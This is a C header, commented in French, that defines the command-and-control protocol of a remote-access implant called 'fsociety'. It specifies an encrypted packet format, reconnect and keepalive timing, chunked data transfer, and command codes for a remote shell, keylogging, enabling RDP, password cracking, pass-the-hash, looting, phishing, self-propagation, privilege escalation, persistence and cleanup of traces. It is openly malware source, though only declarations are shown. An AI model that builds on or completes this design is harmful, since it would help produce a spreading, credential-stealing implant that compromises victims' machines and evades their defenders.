    #ifndef FSO_PROTOCOL_H
    #define FSO_PROTOCOL_H

    #include <stdint.h>
    #include <stddef.h>

    /* ============================================================
     * fsociety — Protocole de communication C2 ↔ Implant
     * ============================================================ */

    /* ---------- Constantes ---------- */

    #define FSO_MAGIC          0x666F7363U   /* "fsoc" */
    #define FSO_VERSION        0x01

    #define FSO_MAX_PAYLOAD    (1024 * 1024) /* 1 Mo */
    #define FSO_HEADER_SIZE    11            /* MAGIC(4) + TYPE(1) + SEQ(2) + LENGTH(4) */
    #define FSO_MAX_CHUNK      (512 * 1024)  /* 512 Ko par chunk */

    #define FSO_IV_SIZE        12
    #define FSO_TAG_SIZE       16
    #define FSO_KEY_SIZE       32

    #define FSO_KEEPALIVE_SEC  30
    #define FSO_TIMEOUT_SEC    60
    #define FSO_RECONNECT_MIN  5
    #define FSO_RECONNECT_MAX  300

    /* ---------- Types de messages ---------- */

    typedef enum {
        MSG_CMD      = 0x01,
        MSG_RESULT   = 0x02,
        MSG_PING     = 0x03,
        MSG_PONG     = 0x04,
        MSG_KEYX     = 0x05,
        MSG_AUTH     = 0x06,
        MSG_ERROR    = 0x07,
        MSG_CHUNK    = 0x08
    } fso_msg_type_t;

    /* ---------- Identifiants de commandes ---------- */

    typedef enum {
        CMD_SHELL          = 0x01,
        CMD_KEYLOG_START   = 0x02,
        CMD_KEYLOG_STOP    = 0x03,
        CMD_KEYLOG_DUMP    = 0x04,
        CMD_RDP_ENABLE     = 0x05,
        CMD_RDP_DISABLE    = 0x06,
        CMD_CRACK          = 0x07,
        CMD_PTH            = 0x08,
        CMD_LOOT           = 0x09,
        CMD_PHISH          = 0x0A,
        CMD_PROPAGATE      = 0x0B,
        CMD_PRIVSEC        = 0x0C,
        CMD_SYSCALL        = 0x0D,
        CMD_SHELL_BUILTIN  = 0x0E,
        CMD_CLEANUP        = 0x0F,
        CMD_PERSIST        = 0x10,
        CMD_WHATEVER       = 0x11
    } fso_cmd_id_t;

    /* ---------- Codes d'erreur ---------- */

    typedef enum {
        FSO_OK              = 0x00,
        FSO_ERR_UNKNOWN_CMD = 0x01,
        FSO_ERR_EXEC        = 0x02,
        FSO_ERR_DECRYPT     = 0x03,
        FSO_ERR_TIMEOUT     = 0x04,
        FSO_ERR_NETWORK     = 0x05,
        FSO_ERR_INVALID     = 0x06,
        FSO_ERR_MEMORY      = 0x07,
        FSO_ERR_CHUNK       = 0x08
    } fso_status_t;

    /* ---------- En-tête de paquet ---------- */

    typedef struct __attribute__((packed)) {
        uint32_t magic;
        uint8_t  type;
        uint16_t seq_id;
        uint32_t length;
    } fso_header_t;

    /* ---------- Payload d'une commande ---------- */

    typedef struct __attribute__((packed)) {
        uint8_t  cmd_id;
    } fso_cmd_t;

    /* ---------- Payload d'un résultat ---------- */

    typedef struct __attribute__((packed)) {
        uint8_t  cmd_id;
        uint8_t  status;
    } fso_result_t;

    /* ---------- Payload d'un chunk ---------- */

    typedef struct __attribute__((packed)) {
        uint32_t transfer_id;
        uint32_t chunk_index;
        uint32_t total_chunks;
        uint16_t chunk_size;
    } fso_chunk_t;

    /* ---------- API protocole ---------- */

    int fso_pack(uint8_t type, uint16_t seq_id,
                 const uint8_t *payload, uint32_t payload_len,
                 uint8_t *out, size_t out_size);

    int fso_unpack(const uint8_t *in, size_t in_size,
                   fso_header_t *header, const uint8_t **payload);

    int fso_build_cmd(uint8_t cmd_id, const char *args,
                      uint8_t *out, size_t out_size);

    int fso_build_result(uint8_t cmd_id, uint8_t status, const char *output,
                         uint8_t *out, size_t out_size);

    int fso_build_chunk(uint32_t transfer_id, uint32_t chunk_index,
                        uint32_t total_chunks, const uint8_t *data,
                        uint16_t data_len, uint8_t *out, size_t out_size);

    /* Parse uniquement l'en-tête (11 octets). Ne touche pas au payload. */
    int fso_unpack_header(const uint8_t *in, size_t in_size,
                          fso_header_t *header);

    #endif /* FSO_PROTOCOL_H */